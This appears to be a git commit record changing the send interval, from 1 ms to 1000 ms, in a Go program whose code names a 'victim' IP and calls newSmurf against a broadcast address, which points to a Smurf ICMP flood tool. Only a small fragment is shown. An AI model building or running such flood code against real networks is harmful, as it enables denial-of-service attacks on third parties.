f197d54be1edc10d330b66b4ed193bcbc2f01f64
Adriano <adriano.selaviles@gmail.com>
2020-04-23 16:46:58 -0700

    change delay

--- main.go
+++ main.go
@@ -13,7 +13,7 @@ const banner = "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"
 func main() {
 	victim := net.IP{192, 168, 1, 73}
 	network := net.IP{192, 168, 1, 255}
-	interval := time.Millisecond * 1
+	interval := time.Millisecond * 1000
 
 	s, err := newSmurf(victim, network)
 	if err != nil {
